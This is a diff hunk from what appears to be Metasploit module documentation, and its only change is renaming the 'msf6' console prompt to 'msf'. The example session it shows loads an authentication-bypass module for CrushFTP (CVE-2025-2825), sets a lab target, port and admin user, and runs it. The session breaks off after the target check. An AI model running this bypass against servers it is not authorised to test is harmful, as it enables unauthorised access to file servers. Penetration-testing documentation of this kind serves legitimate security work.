@@ -29,14 +29,14 @@ To set up a test environment:
 ## Scenarios
 ### CrushFTP on Windows, Linux, or Mac
 ```
-msf6 > use auxiliary/gather/crushftp_authbypass_cve_2025_2825
-msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set RHOSTS 192.168.181.129
+msf > use auxiliary/gather/crushftp_authbypass_cve_2025_2825
+msf auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set RHOSTS 192.168.181.129
 RHOSTS => 192.168.181.129
-msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set RPORT 8080
+msf auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set RPORT 8080
 RPORT => 8080
-msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set TARGETUSER crushadmin
+msf auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set TARGETUSER crushadmin
 TARGETUSER => crushadmin
-msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > show options
+msf auxiliary(gather/crushftp_authbypass_cve_2025_2825) > show options
 
 Module options (auxiliary/gather/crushftp_authbypass_cve_2025_2825):
 
@@ -53,7 +53,7 @@ Module options (auxiliary/gather/crushftp_authbypass_cve_2025_2825):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > run
+msf auxiliary(gather/crushftp_authbypass_cve_2025_2825) > run
 [*] Running module against 192.168.181.129
 
 [*] Confirming the target is a CrushFTP web service
